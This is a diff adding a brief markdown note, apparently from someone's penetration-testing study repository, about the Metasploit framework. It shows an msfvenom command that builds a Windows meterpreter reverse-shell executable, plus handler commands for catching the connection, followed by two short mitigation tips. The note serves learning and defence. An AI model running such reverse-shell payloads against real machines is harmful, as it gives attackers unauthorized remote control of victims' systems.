@@ -1,0 +1,21 @@
+# Metasploit - Exploitation Framework  
+Metasploit is an advanced penetration testing framework used for launching exploits and reverse shells.  
+
+## 🔹 How I Used Metasploit  
+I created a *reverse shell payload* to gain access to a vulnerable Windows machine:  
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
+
+	•	Transferred shell.exe to the target machine
+	•	Used Metasploit to establish a reverse shell connection
+
+🔹 Useful Metasploit Commands
+	•	use exploit/multi/handler → Start a listener
+	•	set payload windows/meterpreter/reverse_tcp → Set the payload
+	•	exploit → Run the attack
+
+🔹 Mitigation Strategy
+
+✅ Disable PowerShell execution for untrusted scripts
+✅ Use endpoint security solutions to detect malware
+
